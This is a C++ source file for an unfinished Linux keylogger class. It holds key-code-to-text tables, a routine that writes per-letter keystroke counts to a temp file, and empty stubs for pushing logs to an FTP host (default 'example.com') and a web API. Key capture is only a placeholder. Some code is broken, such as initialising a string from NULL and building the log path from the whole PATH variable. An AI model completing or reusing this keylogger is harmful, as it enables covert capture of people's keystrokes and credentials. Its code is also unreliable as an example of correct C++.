#include <fstream>
#include <cstdlib>
#include <stdio.h>
#include <iostream>
#include "keylogger.hpp"


static char *key_names[] = {
   UK, "<ESC>",
   "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=",
   "<Backspace>", "<Tab>",
   "q", "w", "e", "r", "t", "y", "u", "i", "o", "p",
   "[", "]", "<Enter>", "<LCtrl>",
   "a", "s", "d", "f", "g", "h", "j", "k", "l", ";",
   "'", "`", "<LShift>",
   "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/",
   "<RShift>",
   "<KP*>",
   "<LAlt>", " ", "<CapsLock>",
   "<F1>", "<F2>", "<F3>", "<F4>", "<F5>", "<F6>", "<F7>", "<F8>", "<F9>", "<F10>",
   "<NumLock>", "<ScrollLock>",
   "<KP7>", "<KP8>", "<KP9>",
   "<KP->",
   "<KP4>", "<KP5>", "<KP6>",
   "<KP+>",
   "<KP1>", "<KP2>", "<KP3>", "<KP0>",
   "<KP.>",
   UK, UK, UK,
   "<F11>", "<F12>",
   UK, UK, UK, UK, UK, UK, UK,
   "<KPEnter>", "<RCtrl>", "<KP/>", "<SysRq>", "<RAlt>", UK,
   "<Home>", "<Up>", "<PageUp>", "<Left>", "<Right>", "<End>", "<Down>",
   "<PageDown>", "<Insert>", "<Delete>"
};

static char *shift_key_names[] = {
   UK, "<ESC>",
   "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+",
   "<Backspace>", "<Tab>",
   "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P",
   "{", "}", "<Enter>", "<LCtrl>",
   "A", "S", "D", "F", "G", "H", "J", "K", "L", ":",
   "\"", "~", "<LShift>",
   "|", "Z", "X", "C", "V", "B", "N", "M", "<", ">", "?",
   "<RShift>",
   "<KP*>",
   "<LAlt>", " ", "<CapsLock>",
   "<F1>", "<F2>", "<F3>", "<F4>", "<F5>", "<F6>", "<F7>", "<F8>", "<F9>", "<F10>",
   "<NumLock>", "<ScrollLock>",
   "<KP7>", "<KP8>", "<KP9>",
   "<KP->",
   "<KP4>", "<KP5>", "<KP6>",
   "<KP+>",
   "<KP1>", "<KP2>", "<KP3>", "<KP0>",
   "<KP.>",
   UK, UK, UK,
   "<F11>", "<F12>",
   UK, UK, UK, UK, UK, UK, UK,
   "<KPEnter>", "<RCtrl>", "<KP/>", "<SysRq>", "<RAlt>", UK,
   "<Home>", "<Up>", "<PageUp>", "<Left>", "<Right>", "<End>", "<Down>",
   "<PageDown>", "<Insert>", "<Delete>"
};

#undef UK

/**
 * Determines whether the key code is a shift
 * @param  code the key code to check
 * @return      true if the key is a shift key, false otherwise
 */
bool isShift(uint16_t code) {
   return code == KEY_LEFTSHIFT || code == KEY_RIGHTSHIFT;
}

/**
 * Converts a key code to an ascii character. See linux/input.h for more
 * information
 *
 * @param  code the key code to convert
 * @return      the corresponding ascii character
 */
char *getKeyText(uint16_t code, uint8_t shift_pressed) {
   ASSERT_ON_COMPILE(ARRAY_SIZE(key_names) == ARRAY_SIZE(shift_key_names));

   // LOG("%s", shift_pressed ? "true" : "false");
   char **arr;
   if (shift_pressed != 0) {
      arr = shift_key_names;
   } else {
      arr = key_names;
   }

   if (code < ARRAY_SIZE(key_names)) {
      return arr[code];
   } else {
      LOG("Unknown key: %u", code);
      return UNKNOWN_KEY;
   }
}

/*
** Ctor
*/

Keylogger::Keylogger(std::string logFile, std::string ftpURL = "example.com")
	: _keys(NULL),
	_logFile(logFile),
	_ftpURL(ftpURL)
{
	const char* env_p = std::getenv("PATH");
	std::string str(env_p);
	_path = str;
}

/*
** Dtor
*/
Keylogger::~Keylogger()
{
	Keylogger::saveKeys();
}

/*
** Simply gather the keys from the system and store then locally (var)
**/

void Keylogger::retrieveKeys()
{
	_keys += "a";
}

/*
** Return the list of keys for some external use I guess
*/

std::string Keylogger::getKeys()
{
	return _keys;
}

std::string randomString(uint len = 15, short loop = 0)
{
	std::string charIndex = "abcdefghijklmnaoqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
	uint ri[15];
	std::string rs = "";

	for (uint i = 0; i < len; ++i)
		rs += charIndex[rand() % charIndex.length()];
	if (rs.empty() && loop < 5)
		return randomString(len, loop + 1);
	else
		return rs;
}


/*
** Save keys to file
*/

void Keylogger::saveKeys()
{
	_tmpLogFile = "/tmp/keylogger_" + randomString(15, 0);
	int count;

	if (_keys.empty())
		return;

	if (_tmpLogFileStream.is_open() == false) {
		_tmpLogFileStream.open(_tmpLogFile.c_str());
	}
	for (int letter = 'a'; letter <= 'z'; letter++) {
		_tmpLogFileStream << letter << ":";
		count = 0;
		for (int i = 0; i < _keys.length(); i++) {
			if (_keys[i] == letter)
				++count;
		}
		_tmpLogFileStream << count << std::endl;
	}
	_tmpLogFileStream.close();
	if (rename(_tmpLogFile.c_str() , (_path + _logFile).c_str() ) == 0)
		std::cout << "Backup sucessful" << std::endl;
	else
		perror("Error saving backup");
}

/*
** FTP Push the keymaps
** TO BE DONE
*/

void Keylogger::pushKeys()
{

}

void Keylogger::webApi()
{

}